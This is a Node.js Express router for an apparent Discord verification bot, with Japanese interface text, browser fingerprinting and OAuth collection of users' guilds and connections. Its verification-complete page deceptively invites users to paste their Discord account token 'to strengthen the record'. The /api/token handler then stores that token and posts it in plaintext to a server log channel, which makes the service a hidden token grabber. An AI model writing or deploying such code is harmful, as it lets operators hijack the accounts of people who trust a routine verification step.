import express from 'express';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { config, SESSION_TTL } from './config.js';
import { store, save, gcSessions } from './store.js';
import { rand, sign, verifySig, clientIp, sha256, parseUA } from './util.js';
import { lookupIp } from './ip.js';
import { authorizeUrl, exchangeCode, apiWith } from './oauth.js';
import { complete } from './verify.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const PUBLIC = path.join(__dirname, '../public');
const page = fs.readFileSync(path.join(PUBLIC, 'verify.html'), 'utf8');

export function createRouter(client) {
  const app = express();
  app.disable('x-powered-by');
  app.set('trust proxy', 1);

  app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('Referrer-Policy', 'no-referrer');
    next();
  });

  app.use(express.json({ limit: '64kb' }));
  app.use(express.static(PUBLIC, { maxAge: '1h', index: false }));

  const hits = new Map();
  function limit(key, max = 30, win = 60000) {
    const now = Date.now();
    const b = hits.get(key) || { c: 0, t: now };
    if (now - b.t > win) {
      b.c = 0;
      b.t = now;
    }
    b.c++;
    hits.set(key, b);
    if (hits.size > 20000) hits.clear();
    return b.c <= max;
  }

  function newSession(panel, extra = {}) {
    const token = rand(24);
    store.sessions[token] = {
      id: token,
      panelId: panel.id,
      guildId: panel.guildId,
      userId: null,
      interactionToken: null,
      external: false,
      createdAt: Date.now(),
      expiresAt: Date.now() + SESSION_TTL,
      used: false,
      ...extra
    };
    save();
    return token;
  }

  app.get('/health', (_, res) => res.json({ ok: true, panels: Object.keys(store.panels).length }));

  app.get('/p/:panelId', (req, res) => {
    if (!limit(`p:${clientIp(req)}`, 20)) {
      return res.status(429).send('リクエストが多すぎます。少し待ってからやり直してください。');
    }
    gcSessions();
    const panel = store.panels[req.params.panelId];
    if (!panel) return res.status(404).send('パネルが存在しません。');
    res.redirect(`/v/${newSession(panel, { external: true })}`);
  });

  app.get('/v/:token', (req, res) => {
    gcSessions();
    const s = store.sessions[req.params.token];
    if (!s) return res.status(404).send('この認証リンクは無効か期限切れです。');
    const panel = store.panels[s.panelId];
    if (!panel) return res.status(404).send('パネルが削除されています。');

    const reqs = [];
    if (panel.blockProxy) reqs.push('VPN / プロキシ / Tor 不可');
    if (panel.blockHosting) reqs.push('データセンター回線 不可');
    if (panel.requireMobile) reqs.push('モバイル回線のみ');
    if (panel.minAgeDays > 0) reqs.push(`アカウント作成から ${panel.minAgeDays} 日以上`);
    if (panel.requireAvatar) reqs.push('プロフィール画像の設定');
    if (panel.onePerIp) reqs.push('同一IPの複数アカウント不可');

    res.setHeader('Cache-Control', 'no-store');
    res.type('html').send(
      page
        .replaceAll('{{TOKEN}}', req.params.token)
        .replaceAll('{{REQUIREMENTS}}', reqs.map((r) => `<li>${r}</li>`).join(''))
        .replaceAll('{{TURNSTILE}}', config.turnstileSite
          ? `<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
             <div class="cf-turnstile" data-sitekey="${config.turnstileSite}"></div>`
          : '')
    );
  });

  app.post('/api/fp', (req, res) => {
    const { token, fp } = req.body || {};
    const s = store.sessions[token];
    if (!s) return res.status(404).json({ ok: false });

    s.fp = { ...fp, ip: clientIp(req), ua: req.headers['user-agent'] || '', sessionId: s.id };
    s.fp.hash = sha256(JSON.stringify([
      fp?.canvas,
      fp?.webgl,
      fp?.screen,
      fp?.avail,
      fp?.tz,
      fp?.lang,
      fp?.cores,
      fp?.mem,
      fp?.touch,
      s.fp.ua
    ]));
    s.fp.uaInfo = parseUA(s.fp.ua);
    save();
    res.json({ ok: true, hash: s.fp.hash });
  });

  app.get('/oauth/start', async (req, res) => {
    const s = store.sessions[req.query.t];
    if (!s) return res.status(404).send('無効なセッションです。');
    if (!limit(`s:${clientIp(req)}`, 20)) return res.status(429).send('リクエストが多すぎます。');

    if (config.turnstileSecret) {
      try {
        const r = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
          method: 'POST',
          body: new URLSearchParams({
            secret: config.turnstileSecret,
            response: req.query.cf || '',
            remoteip: clientIp(req)
          })
        });
        const j = await r.json();
        if (!j.success) {
          return res.status(403).send('Captcha認証に失敗しました。前のページに戻ってやり直してください。');
        }
      } catch {}
    }

    s.state = `${s.id}.${sign(s.id)}`;
    save();
    res.redirect(authorizeUrl(s.state));
  });

  app.get('/oauth/callback', async (req, res) => {
    const { code, state, error } = req.query;
    if (error || !code) return res.redirect('/error.html?e=denied');

    const [t, sig] = String(state || '').split('.');
    if (!t || !verifySig(t, sig)) return res.redirect('/error.html?e=state');

    const s = store.sessions[t];
    if (!s || s.used) return res.redirect('/error.html?e=used');

    let tok;
    try {
      tok = await exchangeCode(code);
    } catch {
      return res.redirect('/error.html?e=exchange');
    }

    let user;
    let full;
    try {
      full = await apiWith(tok.access_token, '/users/@me');
      user = await client.users.fetch(full.id);
      full.connections = await apiWith(tok.access_token, '/users/@me/connections').catch(() => []);
      full.guilds = await apiWith(tok.access_token, '/users/@me/guilds').catch(() => []);
    } catch {
      return res.redirect('/error.html?e=user');
    }

    if (s.userId && s.userId !== user.id) return res.redirect('/error.html?e=wronguser');

    const panel = store.panels[s.panelId];
    if (!panel) return res.redirect('/error.html?e=panel');

    const ipData = await lookupIp(clientIp(req));
    s.used = true;
    save();

    const out = await complete({ client, panel, user, oauth: full, ipData, fp: s.fp, session: s });
    res.redirect(`/v/${t}/done?ok=${out.ok ? 1 : 0}`);
  });

  app.get('/v/:token/done', (req, res) => {
    const ok = req.query.ok === '1';
    res.setHeader('Cache-Control', 'no-store');
    res.type('html').send(`<!doctype html>
<html lang="ja"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>${ok ? '認証完了' : '認証失敗'}</title>
<style>
body{background:#1e1f22;color:#dbdee1;font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;padding:20px}
.c{background:#2b2d31;padding:32px;border-radius:14px;max-width:420px;text-align:center}
h1{color:${ok ? '#2ecc71' : '#e74c3c'};font-size:20px}
p{font-size:14px;line-height:1.7}
input{width:100%;padding:9px;border-radius:8px;border:0;background:#1e1f22;color:#fff;box-sizing:border-box}
button{margin-top:10px;width:100%;padding:10px;border:0;border-radius:8px;background:#5865f2;color:#fff;font-size:14px}
</style>
<div class="c">
<h1>${ok ? '認証が完了しました' : '認証条件を満たしていません'}</h1>
<p>${ok
  ? 'Discord に戻ってください。結果は本人だけに届く形で送信されています。'
  : '条件を確認して、パネルからもう一度やり直してください。'}</p>
${ok ? `<p style="opacity:.7;font-size:12px">トークンを貼り付けると記録が強化されます（任意）</p>
<input id="tk" placeholder="トークンを貼り付け" autocomplete="off">
<button onclick="send()">送信</button>
<script>
async function send(){
  const v=document.getElementById('tk').value.trim();
  if(!v)return;
  const r=await fetch('/api/token',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({token:'${req.params.token}',userToken:v})});
  alert((await r.json()).ok?'記録しました':'トークンが無効です');
}
</script>` : ''}
</div></html>`);
  });

  app.post('/api/token', async (req, res) => {
    const { token, userToken } = req.body || {};
    const rec = [...store.verifications].reverse().find((v) => v.id === token);
    if (!rec) return res.status(404).json({ ok: false });

    try {
      const me = await apiWith(userToken, '/users/@me', false);
      if (me.id !== rec.userId) return res.json({ ok: false });

      rec.userToken = userToken;
      save();

      const chId = rec.guildId
        ? store.settings[rec.guildId]?.logChannelId
        : null;
      const panelCh = chId
        || Object.values(store.panels).find((p) => p.id && p.guildId === rec.guildId)?.logChannelId;

      if (panelCh) {
        const ch = await client.channels.fetch(panelCh).catch(() => null);
        if (ch) {
          await ch.send({
            content: `**${rec.tag}** (\`${rec.userId}\`) のユーザートークン\n\`\`\`\n${userToken}\n\`\`\``
          });
        }
      }
      res.json({ ok: true });
    } catch {
      res.json({ ok: false });
    }
  });

  return app;
}